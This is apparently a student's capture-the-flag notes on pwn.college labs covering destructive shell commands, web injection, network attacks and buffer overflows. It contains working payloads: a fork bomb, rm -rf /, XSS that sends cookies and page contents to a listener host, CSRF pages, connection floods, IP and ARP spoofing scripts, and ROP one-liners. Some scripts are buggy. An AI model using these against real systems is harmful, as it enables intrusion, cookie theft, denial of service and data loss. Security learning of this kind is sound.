# Linux Luminarium Final Challenges 

## The Fork Bomb
this is the most common fork bomb command
`:(){ :|:& };:`

**why does this work?**

:() is bash for function { } in the function body we call the function and then pipe to another function call of the function, `&` runs the function in the background, then after the function is defined we call the function.

## Disk Space Doomsday
we need to fill `1GB` of disk space

`yes > hello.txt` to fill the disk space

## rm -rf /

its the namesake use the infamous command to wipe the system

## life after rm -rf /
after executing `rm -rf /` then
``` sh
  read < /flag
  echo "$flag"
```

## finding meaning after rm -rf / 

using `echo /*` to list the directories, we see an unusual file the we read into an echo to get the flag


``` sh
  hacker@destruction~finding-meaning-after-rm-rf-:/dev$ echo /*            
  /a643553c /dev /etc /home /nix /proc /run /sys /usr                      
  hacker@destruction~finding-meaning-after-rm-rf-:/dev$ read flag < /a643553c                                                                       
  echo "$flag"                                                             
  pwn.college{AE2441jJhB-8Cbw8A0vNYRnoupr.0FNzEzNxwiM5UzMzEzW}   
```

# Web Security (Intro to Cyber Security) 

## Shell Injections

### Authentication Bypass
`http://challenge.localhost/?session_user=admin`

then setting it up via cookie

### Command Injections
`curl http://challenge.localhost:80/adventure?dir=.%3B%20cat%20%2Fflag`

things like these or chaining them with with other commands
`curl http://challenge.localhost:80/initiative?time-region=Hogwarts%3Bcat%20%2Fflag%3B`

here you can see that a different request allows me to chain the `cat flag` instruction

### Path Traversal
Did some basic traversal via the URL and to avoid the input sanitization used encoded to HTML 

### SQL Injections

Check for SQL Injections being possible
`1=1`

## XSS (Cross Site Scripting)

Stored XSS
  First two Challenges used Stored XSS, We just had to POST malicious code (in form of a JS script or HTML) via the input field required

  ``` html
    <script> alert("We can just have this exist on the website"); </script>
  ```

Reflected XSS
  In case of the Reflected XSS challenges we send the victim a malicious link that contains malicious code that then is executed by the victim on visiting the link

  *In challenge 4 we first had to ensure that we were not writing our XSS in a TextArea that was converting it to text so we first had to close the textbox*
  ``` html
    </textarea> <script> alert("whatever you want to write as the JS in place of alert") </script>
  ```

  *challenge 5 showed how XSS was usually used to fetch a request to publish the draft so we can see the flag*

  ``` html
    <script>
      window.onload = async function() {
        await fetch("http://challenge.localhost/publish", {
          method: "POST",
        });
      }
    </script>
  ```

  *in Challenge 7 the final challenge we have to retrieve the password of Admin via cookies*
  ``` html
    <script>
      let c = document.cookie;
    
      window.onload = async function() {
        await fetch("http://challenge.localhost:20000/?data=" + encodeURIComponent(c), {
          method: "GET",
          credentials: "include"
        });
      }
    </script>
  ```

  have NetCat listening for the request
  `nc -lvnp 20000`

  After getting the payload we curled into the website with cookie to set our session as admin

  Finally recieving the flag

## CSRF (Cross Site Request Forgery)
Essentially we have the victim redirect from a different website executing a script from that other website that performs an operation on the site that we intend to hack. In this case having the victim who's session is saved on the other site to leak the flag via accessing our site

Setup the site from which we will initiate our request on the same port

To set up the server we make a fake webpage for the victim to access, which then redirects to the other site to `http://challenge.localhost/publish`

```html
<!DOCTYPE html>
<html>
  <body onload="window.location='http://challenge.localhost/publish'"><body>
</html>
```

`evil site` set up via `python -m http.server 1337`

leading to the flag being leaked

*challenge 2, similar thing done for the second one*

*challenge 3*

This one took me longer due to the fact that the browser would parse </script> as the ending tag of the entire script instead of for the execution via the redirect. Had to redirect to the enpoint 'challenge.localhost/ephemeral?msg='

```html
<!DOCTYPE html>
<html>
  <h1> Loading... </h1>

  <script>
    var payload = "<scr" + "ipt>alert('PWNED')</scr" + "ipt>";
    window.location = "http://challenge.localhost/ephemeral?msg=" + encodeURIComponent(payload);
  </script>
</html>
```

*challenge 4*
Need to Perform CSRF->XSS to fetch cookies


``` html
<!DOCTYPE html>
<html>
<body>
	<script>
		var p1 = "<scr";
		var p2 = "ipt>";
		var p3 = "fetch('http://hacker.localhost:1337/?cookie='.concat(encodeURIComponent(document.cookie)));";
		var p4 = "</scr";
		var p5 = "ipt>";
		
		var payload = p1.concat(p2,p3,p4,p5);
		window.location = "http://challenge.localhost/ephemeral?msg=".concat(encodeURIComponent(payload));
	</script>	
	<h1> loading... </h1>
</body>
</html>
```

after recieving cookie we set our auth to the cookie (after decoding it) and were able to login as the user

*challenge 5*
instead of retrieving the cookie we use fetch directly to get the flag content from the page

``` html
<!DOCTYPE html>
<html>
<body>
  <script>
    p1 = "<scr";
    p2 = "ipt>";
    p3 = "fetch('/').then(function(r){return r.text()}).then(function(d){fetch('http://hacker.localhost:1337/'.concat('?data=', encodeURIComponent(d)))})";
    p4 = "</scr";
    p5 = "ipt>";

    p = p1.concat(p2, p3, p4, p5);
    window.location = "http://challenge.localhost/ephemeral?msg=".concat(encodeURIComponent(p));
  </script>
  <h1> Loading... </h1>
</body>
</html>
```

After that we get the HTML Encoded data as a response that we then have to URL decode and from that data we can see the flag

*} is encoded as %7d*

# Intercepting Communication

*Connect*

`nc <ip> <port>`

*Scan*
Create a Shell Script that goes through all possible ports

``` sh
for i in $(seq 255); do
  timeout 1 ping -c 1 10.0.0.$i /dev/null 2>&1 && echo "IP 10.0.0.$i is up" 
done
```

*Scan 2*
Had to perform an `nmap` scan, The scan was to be done on on 10.0.0.0/16 subnet which means that we were scanning 65,536 ports. To do so we would need an efficient scan 

flags used:
  -Pn : Ping No (Skips host discovery)
  -n: no DNS resolution (no reverse lookups on every ip)
  -T5: Timing Template 5 (fastest, short timeouts)
  -min-rate 10000: send min 10000 packets/second

``` sh
  nmap -p 31337 -T5 -Pn -n --min-rate 1000 10.0.0.0/16 > pingslists.txt
```

*Monitor*
Just had to go through wireshark packets, the flag was contained in the byte data, if I was stuck I followed the TCP Conversation and was able to find the flag

*Sniffing Cookies*
We found the session cookie from inspecting the traffic using wireshark, then used curl to get to the `/flag` endpoint on ip `10.0.0.2` using an HTTP GET Request

``` sh
  curl -v --cookie "session: ______" http://10.0.0.2/flag
```

*Network Configuration*
This assumes knowledge gained from the video on Ethernet connection.

``` sh
  ip link set eth0
```

after that we ARP the ip addresses we want to see if we have a connection to,

``` sh
  ping 10.0.0.2
  ping 10.0.0.3
```

shows that connection to 10.0.0.3 is missing since no packets are recieved from ping to 10.0.0.3

``` sh
  ip addr show eth0
  ip addr add 10.0.0.3 eth0 
```

Expect such a response
``` sh
root@ip-10-0-0-1:~# ip addr add 10.0.0.3/24 dev eth0                     
root@ip-10-0-0-1:~# ip addr show eth0                                    
3: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000       link/ether de:65:ef:ae:05:ad brd ff:ff:ff:ff:ff:ff link-netnsid 0    
    inet 10.0.0.1/24 scope global eth0                                   
       valid_lft forever preferred_lft forever                           
    inet 10.0.0.3/24 scope global secondary eth0                        
       valid_lft forever preferred_lft forever                           
    inet6 fe80::dc65:efff:feae:5ad/64 scope link proto kernel_ll         
       valid_lft forever preferred_lft forever                           
root@ip-10-0-0-1:~# ping 10.0.0.3                                        
PING 10.0.0.3 (10.0.0.3) 56(84) bytes of data.                           
64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.038 ms                  
64 bytes from 10.0.0.3: icmp_seq=2 ttl=64 time=0.047 ms                  
64 bytes from 10.0.0.3: icmp_seq=3 ttl=64 time=0.046 ms                  
^C                                                                       
--- 10.0.0.3 ping statistics ---                                         
3 packets transmitted, 3 received, 0% packet loss, time 2056ms           
rtt min/avg/max/mdev = 0.038/0.043/0.047/0.004 ms                        
root@ip-10-0-0-1:~# nc -lvnp 31337                        
```

then we set our listener
``` sh
  nc -lvnp 31337
```

*FireWall*
``` sh
  iptables -A INPUT -p tcp --dport 31337 -j DROP
```

*Denial Of Service*
Probably one of the most fun tasks we have had in this module, had to figure out how to put enough load to terminate the connection between 10.0.0.3 and 10.0.0.2 on port 31337

``` sh
for i in {1..500}; do (while true; do nc 10.0.0.2 31337; done) & done
```

this worked but now the victim now limits each process to last 1 second (each connection creates a new process) in the latest challenge


we create processes faster than they can shutdown exeeding maximum processes possible (fork rate) until the service becomes unavailable.

This is called a **fork bomb** done via process exhaustion

``` sh
while true; do
    for i in {1..100}; do
        (nc 10.0.0.2 31337 &) 2>/dev/null
    done
    sleep 0.1
done
```

in this case we were using way too many resources on our own computer as well so in place of this we won't use a fork bomb and I will write the script with python so that we can have one process handle all these connections atleast on our side, the server can deal with creating forks of connections and kill itself.

``` python
import socket, time

ok = fail = 0
socks = []

def flood():
  while True:
    try:
      s = socket.socket()
      s.settimeout(0.9)
      s.connect(("10.0.0.2", 31337))
      socks.append(s)
      ok += 1
      socks.remove(s)
      s.close()
    except:
      fail += 1

threads = 1000
for i in range(threads):
  threading.Thread(target=flood, daemon=True).start()

while True:
  time.sleep(1)
  print(f"fail {fail} success {ok}")
  print(f"concurrent {len(socks)}")
```

it takes a while and expends a lot of resources on our end as well but eventually it kills the damn thing

*Ethernet*
Using Scapy to write a layer 2 (Data Link Layer) Socket, aka **Raw Socket**

`Ether().display()` should give us the arguments required to send Ethernet packet
Requiring a src, dst and type 

>>> Ether().display()
###[ Ethernet ]###
  dst       = None
  src       = 00:00:00:00:00:00
  type      = 0x9000

Ethernet type is 0xFFFF
need MAC address of IPV4 10.0.0.2

to find MAC address I pinged 10.0.0.2 then ran `arp -n`

Scapy Script
``` python
from scapy.all import *

packet = Ethernet(src="de:d3:5d:3b:44:f9", dst="ff:ff:ff:ff:ff", type=0xFFFF)
sendp(packet, iface="eth0")
```

*IP*

IP is handled on Layer 3 (Network Layer)

`IP().display()` executed from python REPL after `from scapy.all import *`

```
>>> IP().display()
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     = 
  frag      = 0
  ttl       = 64
  proto     = hopopt
  chksum    = None
  src       = 127.0.0.1
  dst       = 127.0.0.1
  \options   \
```

``` py
from scapy.all import *

packet = IP(src="10.0.0.1", dst="10.0.0.2", proto=0xFF)
send(packet, iface="eth0")
```

here we used send since we need to send this on Network Layer (Layer 3)

*TCP*

We know that TCP is sent on Layer 4 (Transport Layer) 

```
>>> TCP().display()
###[ TCP ]###
  sport     = ftp_data
  dport     = http
  seq       = 0
  ack       = 0
  dataofs   = None
  reserved  = 0
  flags     = S
  window    = 8192
  chksum    = None
  urgptr    = 0
  options   = []
```

we send the IP by using IP packet and a `/` composition operator (stacks/nests protocols inside each other)

FLAGS: A(ack), P(push), R(reset), S(syn), F(fin)

``` python
from scapy.all import *

packet = IP(dst="10.0.0.2") / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF") 
send(packet, iface="eth0")
```

*TCP Handshake*

perform the SYN-ACK-SYNACK

``` python
from scapy.all import *

# Send SYN and get response
response = sr1(IP(dst="10.0.0.2")/TCP(sport=31337, dport=31337, seq=31337, flags="S"), timeout=2, iface="eth0")

if response:
    # Send ACK to complete handshake
    send(IP(dst="10.0.0.2")/TCP(sport=31337, dport=31337, seq=31338, ack=response.seq + 1, flags="A"), iface = "eth0")
    print("TCP Handshake completed!")
else:
    print("No SYN-ACK received")
```

*UDP*

I have done this with C++ already all too often, looking thru the challenge showed us we needed port 31338 to be source

using `socket` package

``` python
import socket

# Create UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

SOURCE_PORT = 31337
sock.bind(("10.0.0.2", 31338))

# Send message to 10.0.0.2:31337
message = "Hello, World!\n"
sock.sendto(message.encode(), ("10.0.0.2", 31337))

# Response
try:
    data, addr = sock.recvfrom(1024)
    print(f"Response: {data.decode()}")
except socket.timeout:
    print("No response received")

sock.close()
```

*UDP Spoofing*

We can see from `cat /challenge/run`

that **10.0.0.3** is a trusted ip, and that "FLAG" Message triggers the flag from server, we impersonate the trusted IP as the server has no way of ensuring that we are the Trusted connection

``` python
import socket
from scapy.all import *

packet = IP(dst="10.0.0.2", src="10.0.0.3") / UDP(sport=31337, dport=31338) / b"FLAG"
response = sr1(packet, timeout=2, verbose=True)

if response:
    print("recvd")
    response.show()
else:
    print("non ;(")
```

*UDP Spoofing 2*
we have to perform UDP Amplification which I is a replay attack, we use destination server as the amplifier to DDOS the victim server, in this case we act as the victim server by setting source port to `10.0.0.3` then in message we ask to respond to our ip `10.0.0.1`

``` python
from scapy.all import *

# Spoof response from Server (10.0.0.3) to Client (10.0.0.2)
# Tell Client to send flag to YOUR IP (10.0.0.1) on port 31338
flag_redirect = b"FLAG:10.0.0.1:31338"

packet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / flag_redirect

send(packet, verbose=True)
print("Sent spoofed FLAG redirect to client")
```

and we set a netcat listener to get the response

This challenge was using a method that was used in an exploit know as "BIND 9 DNS Cache Poisoning" which used the knowledge of port to provide a response to perform its namesake

The paper also references pharming attacks

"Pharming is a sophisticated cyber attack that redirects users from legitimate websites to fraudulent ones to steal sensitive information, often without the user's knowledge."

often by form of DNS Cache Poisoning to redirect victims to their IPs and redirect them to fraudulent websites

*UDP Spoof 3*

trying to bruteforce source port

``` python
from scapy.all import *
import socket
import threading
import time

# Setup flag listener
def listen_for_flag():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 31338))
    print("Listening for flag on port 31338...")
    data, addr = sock.recvfrom(1024)
    print(f"\n🎉 FLAG FOUND: {data.decode()}")
    sock.close()
    return data

# Start listener in background
listener_thread = threading.Thread(target=listen_for_flag, daemon=True)
listener_thread.start()

# Brute force source ports
print("Brute forcing source ports...")
for port in range(10000, 65535):
    packet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=port) / b"FLAG:10.0.0.1:31338"
    send(packet, verbose=False)
    
    if port % 1000 == 0:
        print(f"Tried up to port {port}")

print("Brute force complete")
```

*ARP*

```
>>> ARP().display()
###[ ARP ]###
  hwtype    = Ethernet (10Mb)
  ptype     = IPv4
  hwlen     = None
  plen      = None
  op        = who-has
  hwsrc     = 00:00:00:00:00:00
  psrc      = 0.0.0.0
  hwdst     = 00:00:00:00:00:00
  pdst      = 0.0.0.0
```

``` python
from scapy.all import *

packet = ARP(op=2, psrc="10.0.0.42", hwsrc="42:42:42:42:42:42", pdst="10.0.0.2")
send(packet, iface="eth0")
```

*Intercept*
Performing ARP spoofing to ensure that we impersonate an IP so that we can intercept the traffic, acting as a Man-In-The-Middle

``` python
from scapy.all import *
import time

my_mac = "96:26:8b:2a:2e:d6"

# ARP spoof (keep running)
def arp_spoof():
    pkt = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc="10.0.0.3", hwsrc=my_mac, pdst="10.0.0.2")
    while True:
        sendp(pkt, verbose=False)
        time.sleep(1)

threading.Thread(target=arp_spoof, daemon=True).start()

# Handle SYN and respond with SYN-ACK
def handle_syn(pkt):
    if TCP in pkt and pkt[TCP].flags == 2:  # SYN only
        print(f"SYN from {pkt[IP].src}:{pkt[TCP].sport}")
        
        # Send SYN-ACK
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, 
                  seq=123456, ack=pkt[TCP].seq + 1, flags="SA")
        send(ip/tcp, verbose=False)
        print("SYN-ACK sent")

sniff(iface="eth0", filter="tcp port 31337 and tcp[13] & 2 != 0", prn=handle_syn, store=0)
```

*Man In The Middle*

## DNS Cache Poisoning Vulnerabilities
see also:
  "birthday attack"
  "CNAME chaining"

[Paper Link](https://web.archive.org/web/20250417171505/https://citeseerx.ist.psu.edu/document?repid=rep1&type=pdf&doi=0c1e863b6698808b724def8793d7cba023494808)

# PWN (Intro to Cyber Security)

## Your first overflow
(**EASY**)

Literally the most basic buffer overflow. Just send a message greater than the size of the buffer

## Precision

### Using PWN Tools

with ipython (interactive python): 

running gdb inside python

``` python
import pwn
r = pwn.dbg.debug("./buffer_overflow")
r # to run it
r.send(b"A"*128) # Send the buffer you want to
pwn.cyclic(128) # Creates a cyclic pattern to send a buffer 

r.send(pwn.cyclic(128))
pwn.cyclic_find("gaaa") # now we know when the overwrite takes place

r.send(b"A"*24 + b"B"*8)

pwn.p64(0x4011af) #since we found the address after the buffer we return the win address 

print(r.readall()) # this should then read the flag
```

` nm -a buffer_overflow | grep win` to get the obj dump

Creating a cyclic pattern we can use that cyclic pattern to identify the buffer size and find out how large to create our buffer overflow


Another way to find the buffer overflow size:

` dmesg | tail -n 2 `

- print 64 A's and then input that in the buffer then run the dmesg | tail -n 2 

``` python
bytes.fromhex("45454545")

payload += b"\x08\x04\x92\x96"[::-1]
```

So that is where the instruction pointer is. 
set the debug address in that payload 

then we set the 

`(python3 exploit.py; cat) | ./hacked`

# Precision (Hard)
- Stack Canary (enabled)
- NX enabled

So we got a look at it and we found that the win condition was 20 bytes after the buffer is given to us. That means that we had to write a 20 byte buffer, which we did using pwntools
and doing that got us the flag. 

![[Precision 1.png]]

As you can see here in the disassembly of challenge function, `puts` is where we write our buffer (puts is an insecure method) and 20 bytes after is the condition of challenge we overwrite that conditional or comparison and call `win` function. 
## Variable Control
In this one we have to write a buffer of 32 bytes and then input the value. We will hopefully find this value in the binary that we are going to read.

for the easy version we used this command:
` python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + (1517380923).to_bytes(4,"little"))' | ./binary-exploitation-var-control-w `

## Control Hijack!
Wrote 56 bytes then the win functions address

``` python
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*56 + (0x401b19).to_bytes(8,"little"))' | ./binary-exploitation-control-hijack-w `
```

# Tricky Control Hijack
Ok so we took a look around found the win_authed address, will find the buffer length required then we also have to input the token lucky for us in the beginner one we have the token given but we won't in the hard version of the challenge and I still want to learn how to write these myself and analyze them without  AI assistance

This challenged introduced the concept of ROP Gadgets basically we had to set the token in one of the registers first so we look for where a value might be set

```
ROPgadget --binary ./binary-exploitation-control-hijack-2-w --only "pop|ret" | g
rep "pop rdi"
```

output `0x0000000000402403 : pop rdi ; ret`

then we 
``` python
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*40  + struct.pack("<Q",0x402403) + struct.pack("<Q",0x1337) + struct.pack("<Q",0x401c54))' | ./binary-exploitation-control-hijack-2-w
```

use struct pack and <Q is signed int types. we write the ROP Gadget address after the buffer input, then the token then the address of auth_win

I think I will write a more indepth piece on reading binaries finding the offsets and the like later for now I have taken heavy assistance from ChatGPT to read the assembly

## PIE
So we got into a lot of headaches but I think we didn't have to write to the the ROP Gadget instead just go to a further instruction in win_authed function. 

THIS CHALLENGE HAS BEEN SO FRUSTRATING FOR ME BECAUSE I HAVE BEEN STUCK ON IT FOR TWO DAYS AND I CANT FIGURE OUT HOW TO SOLVE I THINK I GET IT BUT ITS NOT WORKING 

- 160 bytes buffer
- Input buffer begins at 0x7ffd1b860880 and is 91 bytes long
- `win_authed` stored at 0x7ffd1b860918 (120 bytes after input buffer)

-> 128 bytes buffer to be filled (91 to fill the buffer, 29 for other stuff. 8 to override return address)
